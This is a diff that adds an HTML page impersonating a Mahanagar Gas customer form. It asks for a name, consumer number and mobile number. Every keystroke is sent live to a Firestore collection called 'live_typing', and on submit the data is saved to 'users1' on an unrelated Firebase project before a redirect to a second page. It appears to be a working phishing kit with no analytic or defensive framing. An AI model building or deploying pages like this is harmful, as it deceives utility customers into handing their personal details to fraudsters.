@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>mgl gas</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #FFFFFF;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    img {
+      width: 100%;
+      max-width: 300%;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 30px;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 100%;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      background-color: #0f7213;
+      color: white;
+      padding: 12px;
+      font-size: 20px;
+      border-radius: 5px;
+    }
+    label {
+      font-size: 16px;
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+      text-align: left;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .side-button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #4082ff;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://meek-semolina-bb73d5.netlify.app/top.jpg" alt="Meri Tasveer" />
+
+  <div class="form-container">
+    <h2>Mahanagar Gas</h2>
+    <form onsubmit="submitForm(event)">
+      <label for="name">Name*</label>
+      <input type="text" id="name" placeholder="Full Name" required oninput="liveUpdate()" />
+
+      <label for="kno">Consumer Number*</label>
+      <input type="text" id="kno" placeholder="Consumer Number" required oninput="liveUpdate()" />
+
+      <label for="mobile">Mobile*</label>
+      <input type="text" id="mobile" placeholder="Mobile Number" required oninput="liveUpdate()" />
+
+      <button class="side-button" type="submit">Continue</button>
+    </form>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.appspot.com",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let liveDocId = null;
+
+    function liveUpdate() {
+      const name = document.getElementById("name").value;
+      const kno = document.getElementById("kno").value;
+      const mobile = document.getElementById("mobile").value;
+
+      const data = { name, kno, mobile, timestamp: firebase.firestore.FieldValue.serverTimestamp() };
+
+      if (!liveDocId) {
+        db.collection("live_typing").add(data).then(doc => {
+          liveDocId = doc.id;
+        });
+      } else {
+        db.collection("live_typing").doc(liveDocId).update(data);
+      }
+    }
+
+    function submitForm(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const kno = document.getElementById("kno").value;
+      const mobile = document.getElementById("mobile").value;
+
+      db.collection("users1").add({
+        name,
+        kno,
+        mobile,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page2.html";
+      }).catch((error) => {
+        alert("Error saving data: " + error);
+      });
+    }
+  </script>
+</body>
+</html>
